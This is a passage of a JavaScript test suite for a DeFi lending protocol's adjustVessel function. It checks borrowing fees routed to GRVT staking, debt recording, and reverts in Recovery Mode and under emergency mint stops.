			// await vesselManager.setLastFeeOpTimeToNow(erc20.address)
			// Check baseRate is now non-zero
			const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
			// assert.isTrue(baseRate_1.gt(toBN("0")))
			assert.isTrue(baseRate_1_Asset.gt(toBN("0")))
			const lastFeeOpTime_1_Asset = await vesselManager.lastFeeOperationTime(erc20.address)
			// 10 seconds pass
			th.fastForwardTime(10, web3.currentProvider)
			// Borrower C triggers a fee
			await borrowerOperations.adjustVessel(
				erc20.address,
				0,
				0,
				dec(1, 18),
				true,
				C,
				C,
				{ from: C }
			)
			const lastFeeOpTime_2_Asset = await vesselManager.lastFeeOperationTime(erc20.address)
			// Check that the last fee operation time did not update, as borrower D's debt issuance occured
			// since before minimum interval had passed
			assert.isTrue(lastFeeOpTime_2.eq(lastFeeOpTime_1))
			assert.isTrue(lastFeeOpTime_2_Asset.eq(lastFeeOpTime_1_Asset))
			// 60 seconds passes
			th.fastForwardTime(60, web3.currentProvider)
			// Check that now, at least one minute has passed since lastFeeOpTime_1
			const timeNow = await th.getLatestBlockTimestamp(web3)
			assert.isTrue(toBN(timeNow).sub(lastFeeOpTime_1).gte(60))
			// Borrower C triggers a fee
			await borrowerOperations.adjustVessel(
				erc20.address,
				0,
				0,
				dec(1, 18),
				true,
				C,
				C,
				{ from: C }
			)
			const lastFeeOpTime_3_Asset = await vesselManager.lastFeeOperationTime(erc20.address)
			// Check that the last fee operation time DID update, as borrower's debt issuance occured
			// after minimum interval had passed
			assert.isTrue(lastFeeOpTime_3.gt(lastFeeOpTime_1))
			assert.isTrue(lastFeeOpTime_3_Asset.gt(lastFeeOpTime_1_Asset))
		})
		it("adjustVessel(): borrower can't grief the baseRate and stop it decaying by issuing debt at higher frequency than the decay granularity", async () => {
			// Artificially make baseRate 5%
			// Check baseRate is now non-zero
			// assert.isTrue(baseRate_1.gt(toBN("0")))
			// Borrower C triggers a fee, before decay interval of 1 minute has passed
			// 1 minute passes
			th.fastForwardTime(60, web3.currentProvider)
			// Borrower C triggers another fee
			// Check base rate has decreased even though Borrower tried to stop it decaying
			assert.isTrue(baseRate_2.lt(baseRate_1))
		}) */

		it("adjustVessel(): borrowing at non-zero base rate sends VUSD fee to GRVT staking contract", async () => {
			// time fast-forwards 1 year, and multisig stakes 1 GRVT
			await th.fastForwardTime(timeValues.SECONDS_IN_ONE_YEAR, web3.currentProvider)
			await grvtToken.approve(grvtStaking.address, dec(1, 18), { from: multisig })
			await grvtStaking.stake(dec(1, 18), { from: multisig })

			// Check GRVT VUSD balance before == 0
			const GRVTStaking_VUSDBalance_Before = await debtToken.balanceOf(grvtStaking.address)
			assert.equal(GRVTStaking_VUSDBalance_Before, "0")

			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(30, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})

			// Artificially make baseRate 5%

			// await vesselManager.setBaseRate(erc20.address, dec(5, 16))
			// await vesselManager.setLastFeeOpTimeToNow(erc20.address)

			// Check baseRate is now non-zero

			const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.isTrue(baseRate_1_Asset.gt(toBN("0")))

			// 2 hours pass
			th.fastForwardTime(7200, web3.currentProvider)

			// D adjusts vessel
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(37, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})

			// Check GRVT VUSD balance after has increased
			const GRVTStaking_VUSDBalance_After = await debtToken.balanceOf(grvtStaking.address)
			assert.isTrue(GRVTStaking_VUSDBalance_After.gt(GRVTStaking_VUSDBalance_Before))
		})

		if (!withProxy) {
			// TODO: use rawLogs instead of logs
			it("adjustVessel(): borrowing at non-zero base records the (drawn debt + fee) on the Vessel struct", async () => {
				// time fast-forwards 1 year, and multisig stakes 1 GRVT
				await th.fastForwardTime(timeValues.SECONDS_IN_ONE_YEAR, web3.currentProvider)
				await grvtToken.approve(grvtStaking.address, dec(1, 18), { from: multisig })
				await grvtStaking.stake(dec(1, 18), { from: multisig })

				await openVessel({
					asset: erc20.address,
					ICR: toBN(dec(10, 18)),
					extraParams: { from: whale },
				})
				await openVessel({
					asset: erc20.address,
					extraVUSDAmount: toBN(dec(30, 18)),
					ICR: toBN(dec(2, 18)),
					extraParams: { from: A },
				})
				await openVessel({
					asset: erc20.address,
					extraVUSDAmount: toBN(dec(40, 18)),
					ICR: toBN(dec(2, 18)),
					extraParams: { from: B },
				})
				await openVessel({
					asset: erc20.address,
					extraVUSDAmount: toBN(dec(50, 18)),
					ICR: toBN(dec(2, 18)),
					extraParams: { from: C },
				})
				await openVessel({
					asset: erc20.address,
					extraVUSDAmount: toBN(dec(50, 18)),
					ICR: toBN(dec(2, 18)),
					extraParams: { from: D },
				})

				const D_debtBefore_Asset = await getVesselEntireDebt(D, erc20.address)

				// Artificially make baseRate 5%
				// await vesselManager.setBaseRate(erc20.address, dec(5, 16))
				// await vesselManager.setLastFeeOpTimeToNow(erc20.address)

				// Check baseRate is now non-zero
				// assert.isTrue(baseRate_1.gt(toBN("0")))

				const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
				assert.isTrue(baseRate_1_Asset.gt(toBN("0")))

				// 2 hours pass
				th.fastForwardTime(7200, web3.currentProvider)

				const withdrawal_D = toBN(dec(37, 18))

				// D withdraws VUSD
				const adjustmentTx_Asset = await borrowerOperations.adjustVessel(
					erc20.address,
					0,
					0,
					withdrawal_D,
					true,
					D,
					D,
					{ from: D }
				)

				const emittedFee_Asset = toBN(th.getVUSDFeeFromVUSDBorrowingEvent(adjustmentTx_Asset))
				assert.isTrue(emittedFee_Asset.gt(toBN("0")))

				const D_newDebt_Asset = (await vesselManager.Vessels(D, erc20.address))[th.VESSEL_DEBT_INDEX]

				// Check debt on Vessel struct equals initila debt plus drawn debt plus emitted fee

				assert.isTrue(D_newDebt_Asset.eq(D_debtBefore_Asset.add(withdrawal_D).add(emittedFee_Asset)))
			})
		}

		it("adjustVessel(): borrowing at non-zero base rate increases the GRVT staking contract VUSD fees-per-unit-staked", async () => {
			// time fast-forwards 1 year, and multisig stakes 1 GRVT
			await th.fastForwardTime(timeValues.SECONDS_IN_ONE_YEAR, web3.currentProvider)
			await grvtToken.approve(grvtStaking.address, dec(1, 18), { from: multisig })
			await grvtStaking.stake(dec(1, 18), { from: multisig })

			// Check GRVT contract VUSD fees-per-unit-staked is zero
			const F_VUSD_Before = await grvtStaking.F_DEBT_TOKENS()
			assert.equal(F_VUSD_Before, "0")

			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(30, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})

			// Artificially make baseRate 5%

			// await vesselManager.setBaseRate(erc20.address, dec(5, 16))
			// await vesselManager.setLastFeeOpTimeToNow(erc20.address)

			// Check baseRate is now non-zero
			// assert.isTrue(baseRate_1.gt(toBN("0")))

			const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.isTrue(baseRate_1_Asset.gt(toBN("0")))

			// 2 hours pass
			th.fastForwardTime(7200, web3.currentProvider)

			// D adjusts vessel
			const F_VUSD_BeforeAdjust = await grvtStaking.F_DEBT_TOKENS()

			await borrowerOperations.adjustVessel(erc20.address, 0, 0, dec(37, 18), true, D, D, {
				from: D,
			})

			const F_VUSD_After_Asset = await grvtStaking.F_DEBT_TOKENS()
			assert.isTrue(F_VUSD_After_Asset.gt(F_VUSD_BeforeAdjust))
		})

		it("adjustVessel(): borrowing at non-zero base rate sends requested amount to the user", async () => {
			// time fast-forwards 1 year, and multisig stakes 1 GRVT
			await th.fastForwardTime(timeValues.SECONDS_IN_ONE_YEAR, web3.currentProvider)
			await grvtToken.approve(grvtStaking.address, dec(1, 18), { from: multisig })
			await grvtStaking.stake(dec(1, 18), { from: multisig })

			// Check GRVT Staking contract balance before == 0
			const GRVTStaking_VUSDBalance_Before = await debtToken.balanceOf(grvtStaking.address)
			assert.equal(GRVTStaking_VUSDBalance_Before, "0")

			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(30, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})

			const D_VUSDBalanceBefore = await debtToken.balanceOf(D)

			// Artificially make baseRate 5%

			// await vesselManager.setBaseRate(erc20.address, dec(5, 16))
			// await vesselManager.setLastFeeOpTimeToNow(erc20.address)

			// Check baseRate is now non-zero
			// assert.isTrue(baseRate_1.gt(toBN("0")))

			const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.isTrue(baseRate_1_Asset.gt(toBN("0")))

			// 2 hours pass
			th.fastForwardTime(7200, web3.currentProvider)

			// D adjusts vessel
			const VUSDRequest_D = toBN(dec(40, 18))

			// Check GRVT staking VUSD balance has increased
			const GRVTStaking_VUSDBalance_After = await debtToken.balanceOf(grvtStaking.address)

			// Check D's VUSD balance has increased by their requested VUSD
			const D_VUSDBalanceAfter = await debtToken.balanceOf(D)

			await borrowerOperations.adjustVessel(erc20.address, 0, 0, VUSDRequest_D, true, D, D, {
				from: D,
			})

			// Check GRVT staking VUSD balance has increased
			const GRVTStaking_VUSDBalance_After_Asset = await debtToken.balanceOf(grvtStaking.address)
			assert.isTrue(GRVTStaking_VUSDBalance_After_Asset.gt(GRVTStaking_VUSDBalance_After))

			// Check D's VUSD balance has increased by their requested VUSD
			const D_VUSDBalanceAfter_Asset = await debtToken.balanceOf(D)
			assert.isTrue(D_VUSDBalanceAfter_Asset.eq(D_VUSDBalanceAfter.add(VUSDRequest_D)))
		})

		// NOTE: Logic changed
		it("adjustVessel(): borrowing at zero borrowing fee doesn't VUSD balance of GRVT staking contract", async () => {
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(30, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})

			// Check baseRate is zero
			// assert.equal(baseRate_1, "0")

			await adminContract.setBorrowingFee(erc20.address, 0)
			const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.equal(baseRate_1_Asset, "0")

			// 2 hours pass
			th.fastForwardTime(7200, web3.currentProvider)

			// Check staking VUSD balance before > 0
			const GRVTStaking_VUSDBalance_Before = await debtToken.balanceOf(grvtStaking.address)
			assert.isTrue(GRVTStaking_VUSDBalance_Before.gt(toBN("0")))

			// D adjusts vessel
			const GRVTStaking_VUSDBalance_After = await debtToken.balanceOf(grvtStaking.address)

			await borrowerOperations.adjustVessel(erc20.address, 0, 0, dec(37, 18), true, D, D, {
				from: D,
			})
			const GRVTStaking_VUSDBalance_After_Asset = await debtToken.balanceOf(grvtStaking.address)
			assert.isTrue(GRVTStaking_VUSDBalance_After_Asset.eq(GRVTStaking_VUSDBalance_After))
		})
		// Changed logic
		it("adjustVessel(): borrowing at zero borrowing fee doesn't change GRVT staking contract VUSD fees-per-unit-staked", async () => {
			await openVessel({
				asset: erc20.address,
				assetSent: toBN(dec(100, "ether")),
				extraVUSDAmount: toBN(dec(20000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})

			// Check baseRate is zero
			// assert.equal(baseRate_1, "0")
			await adminContract.setBorrowingFee(erc20.address, 0)
			const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.equal(baseRate_1_Asset, "0")

			// 2 hours pass
			th.fastForwardTime(7200, web3.currentProvider)

			// A artificially receives GRVT, then stakes it
			await grvtToken.unprotectedMint(A, dec(100, 18))
			await grvtStaking.stake(dec(100, 18), { from: A })

			// Check staking VUSD balance before == 0
			const F_VUSD_Before = await grvtStaking.F_DEBT_TOKENS()
			assert.isTrue(F_VUSD_Before.eq(toBN("0")))

			// D adjusts vessel
			const F_VUSD_After = await grvtStaking.F_DEBT_TOKENS()
			await borrowerOperations.adjustVessel(erc20.address, 0, 0, dec(37, 18), true, D, D, {
				from: D,
			})

			const F_VUSD_After_Asset = await grvtStaking.F_DEBT_TOKENS()
			assert.isTrue(F_VUSD_After_Asset.eq(F_VUSD_After))
		})

		it("adjustVessel(): borrowing at zero base rate sends total requested VUSD to the user", async () => {
			await openVessel({
				asset: erc20.address,
				assetSent: toBN(dec(100, "ether")),
				extraVUSDAmount: toBN(dec(20000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})

			// Check baseRate is zero
			// assert.equal(baseRate_1, "0")
			await adminContract.setBorrowingFee(erc20.address, 0)

			const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.equal(baseRate_1_Asset, "0")

			// 2 hours pass
			th.fastForwardTime(7200, web3.currentProvider)

			// D adjusts vessel
			const VUSDRequest_D = toBN(dec(40, 18))
			const VUSDBalanceAfter = await debtToken.balanceOf(D)

			await borrowerOperations.adjustVessel(erc20.address, 0, 0, VUSDRequest_D, true, D, D, {
				from: D,
			})
			const VUSDBalanceAfter_Asset = await debtToken.balanceOf(D)
			assert.isTrue(VUSDBalanceAfter_Asset.eq(VUSDBalanceAfter.add(VUSDRequest_D)))
		})

		it("adjustVessel(): reverts when calling address has no active vessel", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(20000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})

			// Alice coll and debt increase(+1 ETH, +50VUSD)
			await borrowerOperations.adjustVessel(erc20.address, dec(1, "ether"), 0, dec(50, 18), true, alice, alice, {
				from: alice,
			})

			try {
				const txCarolAsset = await borrowerOperations.adjustVessel(
					erc20.address,
					dec(1, "ether"),
					0,
					dec(50, 18),
					true,
					carol,
					carol,
					{ from: carol }
				)
				assert.isFalse(txCarolAsset.receipt.status)
			} catch (err) {
				assert.include(err.message, "revert")
			}
		})

		it("adjustVessel(): reverts in Recovery Mode when the adjustment would reduce the TCR", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(20000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})

			assert.isFalse(await th.checkRecoveryMode(contracts, erc20.address))

			const txAliceAsset = await borrowerOperations.adjustVessel(
				erc20.address,
				dec(1, "ether"),
				0,
				dec(50, 18),
				true,
				alice,
				alice,
				{ from: alice }
			)
			assert.isTrue(txAliceAsset.receipt.status)

			await priceFeed.setPrice(erc20.address, dec(120, 18)) // trigger drop in ETH price

			assert.isTrue(await th.checkRecoveryMode(contracts, erc20.address))

			try {
				// collateral withdrawal should also fail
				const txAlice = await borrowerOperations.adjustVessel(
					erc20.address,
					0,
					dec(1, "ether"),
					0,
					false,
					alice,
					alice,
					{ from: alice }
				)
				assert.isFalse(txAlice.receipt.status)
			} catch (err) {
				assert.include(err.message, "revert")
			}

			try {
				// debt increase should fail
				const txBob = await borrowerOperations.adjustVessel(erc20.address, 0, 0, dec(50, 18), true, bob, bob, {
					from: bob,
				})
				assert.isFalse(txBob.receipt.status)
			} catch (err) {
				assert.include(err.message, "revert")
			}

			try {
				// debt increase that's also a collateral increase should also fail, if ICR will be worse off
				const txBob = await borrowerOperations.adjustVessel(
					erc20.address,
					dec(1, "ether"),
					0,
					dec(111, 18),
					true,
					bob,
					bob,
					{ from: bob }
				)
				assert.isFalse(txBob.receipt.status)
			} catch (err) {
				assert.include(err.message, "revert")
			}
		})

		it("adjustVessel(): collateral withdrawal reverts in Recovery Mode", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(20000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})

			assert.isFalse(await th.checkRecoveryMode(contracts, erc20.address))

			await priceFeed.setPrice(erc20.address, dec(120, 18)) // trigger drop in ETH price

			assert.isTrue(await th.checkRecoveryMode(contracts, erc20.address))

			// Alice attempts an adjustment that repays half her debt BUT withdraws 1 wei collateral, and fails
			await assertRevert(
				borrowerOperations.adjustVessel(erc20.address, 0, 1, dec(5000, 18), false, alice, alice, { from: alice }),
				"BorrowerOps: Collateral withdrawal not permitted Recovery Mode"
			)
		})

		it("adjustVessel(): debt increase that would leave ICR < 150% reverts in Recovery Mode", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(20000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})

			const CCRERC20 = await adminContract.getCcr(erc20.address)

			assert.isFalse(await th.checkRecoveryMode(contracts, erc20.address))

			await priceFeed.setPrice(erc20.address, dec(120, 18)) // trigger drop in ETH price
			const price = await priceFeed.getPrice(erc20.address)

			assert.isTrue(await th.checkRecoveryMode(contracts, erc20.address))

			const ICR_A_Asset = await vesselManager.getCurrentICR(erc20.address, alice, price)

			const aliceColl = await getVesselEntireColl(alice)
			const aliceDebt_Asset = await getVesselEntireDebt(alice, erc20.address)
			const aliceColl_Asset = await getVesselEntireColl(alice, erc20.address)

			const debtIncrease = toBN(dec(50, 18))
			const collIncrease = toBN(dec(1, "ether"))

			// Check the new ICR would be an improvement, but less than the CCR (150%)

			const newICR_Asset = await vesselManager.computeICR(
				aliceColl_Asset.add(collIncrease),
				aliceDebt_Asset.add(debtIncrease),
				price
			)

			assert.isTrue(newICR_Asset.gt(ICR_A_Asset) && newICR_Asset.lt(CCRERC20))

			await assertRevert(
				borrowerOperations.adjustVessel(erc20.address, collIncrease, 0, debtIncrease, true, alice, alice, {
					from: alice,
				}),
				"BorrowerOps: Operation must leave vessel with ICR >= CCR"
			)
		})

		it("adjustVessel(): debt increase that would reduce the ICR reverts in Recovery Mode", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(3, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})
			const CCRERC20 = await adminContract.getCcr(erc20.address)

			assert.isFalse(await th.checkRecoveryMode(contracts, erc20.address))

			await priceFeed.setPrice(erc20.address, dec(105, 18)) // trigger drop in ETH price
			const price = await priceFeed.getPrice(erc20.address)

			assert.isTrue(await th.checkRecoveryMode(contracts, erc20.address))

			//--- Alice with ICR > 150% tries to reduce her ICR ---

			const ICR_A_Asset = await vesselManager.getCurrentICR(erc20.address, alice, price)

			// Check Alice's initial ICR is above 150%

			assert.isTrue(ICR_A_Asset.gt(CCRERC20))

			const aliceDebt_Asset = await getVesselEntireDebt(alice, erc20.address)
			const aliceColl_Asset = await getVesselEntireColl(alice, erc20.address)

			const aliceDebtIncrease = toBN(dec(150, 18))
			const aliceCollIncrease = toBN(dec(1, "ether"))

			const newICR_A_Asset = await vesselManager.computeICR(
				aliceColl_Asset.add(aliceCollIncrease),
				aliceDebt_Asset.add(aliceDebtIncrease),
				price
			)

			// Check Alice's new ICR would reduce but still be greater than 150%

			assert.isTrue(newICR_A_Asset.lt(ICR_A_Asset) && newICR_A_Asset.gt(CCRERC20))

			await assertRevert(
				borrowerOperations.adjustVessel(erc20.address, 0, aliceCollIncrease, aliceDebtIncrease, true, alice, alice, {
					from: alice,
				}),
				"BorrowerOps: Cannot decrease your Vessel's ICR in Recovery Mode"
			)

			//--- Bob with ICR < 150% tries to reduce his ICR ---

			const ICR_B_Asset = await vesselManager.getCurrentICR(erc20.address, bob, price)

			// Check Bob's initial ICR is below 150%

			assert.isTrue(ICR_B_Asset.lt(CCRERC20))

			const bobDebt_Asset = await getVesselEntireDebt(bob, erc20.address)
			const bobColl_Asset = await getVesselEntireColl(bob, erc20.address)

			const bobDebtIncrease = toBN(dec(450, 18))
			const bobCollIncrease = toBN(dec(1, "ether"))

			const newICR_B_Asset = await vesselManager.computeICR(
				bobColl_Asset.add(bobCollIncrease),
				bobDebt_Asset.add(bobDebtIncrease),
				price
			)

			// Check Bob's new ICR would reduce
			assert.isTrue(newICR_B_Asset.lt(ICR_B_Asset))

			await assertRevert(
				borrowerOperations.adjustVessel(erc20.address, bobCollIncrease, 0, bobDebtIncrease, true, bob, bob, {
					from: bob,
				}),
				" BorrowerOps: Operation must leave vessel with ICR >= CCR"
			)
		})

		it("adjustVessel(): A vessel with ICR < CCR in Recovery Mode can adjust their vessel to ICR > CCR", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})
			const CCRERC20 = await adminContract.getCcr(erc20.address)

			assert.isFalse(await th.checkRecoveryMode(contracts, erc20.address))

			await priceFeed.setPrice(erc20.address, dec(100, 18)) // trigger drop in ETH price
			const price = await priceFeed.getPrice(erc20.address)

			assert.isTrue(await th.checkRecoveryMode(contracts, erc20.address))

			const ICR_A_Asset = await vesselManager.getCurrentICR(erc20.address, alice, price)
			// Check initial ICR is below 150%

			assert.isTrue(ICR_A_Asset.lt(CCRERC20))

			const aliceDebt_Asset = await getVesselEntireDebt(erc20.address, alice)
			const aliceColl_Asset = await getVesselEntireColl(erc20.address, alice)

			const debtIncrease = toBN(dec(5000, 18))
			const collIncrease = toBN(dec(150, "ether"))

			const newICR_Asset = await vesselManager.computeICR(
				aliceColl_Asset.add(collIncrease),
				aliceDebt_Asset.add(debtIncrease),
				price
			)

			// Check new ICR would be > 150%
			assert.isTrue(newICR_Asset.gt(CCRERC20))

			const tx_Asset = await borrowerOperations.adjustVessel(
				erc20.address,
				collIncrease,
				0,
				debtIncrease,
				true,
				alice,
				alice,
				{ from: alice }
			)
			assert.isTrue(tx_Asset.receipt.status)

			const actualNewICR_Asset = await vesselManager.getCurrentICR(erc20.address, alice, price)
			assert.isTrue(actualNewICR_Asset.gt(CCRERC20))
		})

		it("adjustVessel(): A vessel with ICR < CCR in Recovery Mode can adjust their vessel to ICR > CCR But collateral is blocked from minting, then unblock it", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})
			const CCRERC20 = await adminContract.getCcr(erc20.address)

			assert.isFalse(await th.checkRecoveryMode(contracts, erc20.address))

			await priceFeed.setPrice(erc20.address, dec(100, 18)) // trigger drop in ETH price
			const price = await priceFeed.getPrice(erc20.address)

			assert.isTrue(await th.checkRecoveryMode(contracts, erc20.address))

			const ICR_A_Asset = await vesselManager.getCurrentICR(erc20.address, alice, price)
			// Check initial ICR is below 150%

			assert.isTrue(ICR_A_Asset.lt(CCRERC20))

			const aliceDebt_Asset = await getVesselEntireDebt(erc20.address, alice)
			const aliceColl_Asset = await getVesselEntireColl(erc20.address, alice)

			const debtIncrease = toBN(dec(5000, 18))
			const collIncrease = toBN(dec(150, "ether"))

			const newICR_Asset = await vesselManager.computeICR(
				aliceColl_Asset.add(collIncrease),
				aliceDebt_Asset.add(debtIncrease),
				price
			)

			// Check new ICR would be > 150%
			assert.isTrue(newICR_Asset.gt(CCRERC20))

			await contracts.debtToken.emergencyStopMinting(erc20.address, true)

			await assertRevert(
				borrowerOperations.adjustVessel(erc20.address, collIncrease, 0, debtIncrease, true, alice, alice, {
					from: alice,
				}),
				" Mint is blocked on this collateral"
			)

			await contracts.debtToken.emergencyStopMinting(erc20.address, false)

			const tx_Asset = await borrowerOperations.adjustVessel(
				erc20.address,
				collIncrease,
				0,
				debtIncrease,
				true,
				alice,
				alice,
				{ from: alice }
			)
			assert.isTrue(tx_Asset.receipt.status)

			const actualNewICR_Asset = await vesselManager.getCurrentICR(erc20.address, alice, price)
			assert.isTrue(actualNewICR_Asset.gt(CCRERC20))
		})

		it("adjustVessel(): A vessel with ICR > CCR in Recovery Mode can improve their ICR", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(3, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})
			const CCRERC20 = await adminContract.getCcr(erc20.address)

			assert.isFalse(await th.checkRecoveryMode(contracts, erc20.address))

			await priceFeed.setPrice(erc20.address, dec(105, 18)) // trigger drop in ETH price
			const price = await priceFeed.getPrice(erc20.address)

			assert.isTrue(await th.checkRecoveryMode(contracts, erc20.address))

			const initialICR_Asset = await vesselManager.getCurrentICR(erc20.address, alice, price)
			// Check initial ICR is above 150%
			assert.isTrue(initialICR_Asset.gt(CCRERC20))

			const aliceDebt_Asset = await getVesselEntireDebt(alice, erc20.address)
			const aliceColl_Asset = await getVesselEntireColl(alice, erc20.address)

			const debtIncrease = toBN(dec(5000, 18))
			const collIncrease = toBN(dec(150, "ether"))

			const newICR_Asset = await vesselManager.computeICR(
				aliceColl_Asset.add(collIncrease),
				aliceDebt_Asset.add(debtIncrease),
				price
			)

			// Check new ICR would be > old ICR
			assert.isTrue(newICR_Asset.gt(initialICR_Asset))

			const tx_Asset = await borrowerOperations.adjustVessel(
				erc20.address,
				collIncrease,
				0,
				debtIncrease,
				true,
				alice,
				alice,
				{ from: alice }
			)
			assert.isTrue(tx_Asset.receipt.status)

			const actualNewICR_Asset = await vesselManager.getCurrentICR(erc20.address, alice, price)
			assert.isTrue(actualNewICR_Asset.gt(initialICR_Asset))
		})

		it("adjustVessel(): debt increase in Recovery Mode charges no fee", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
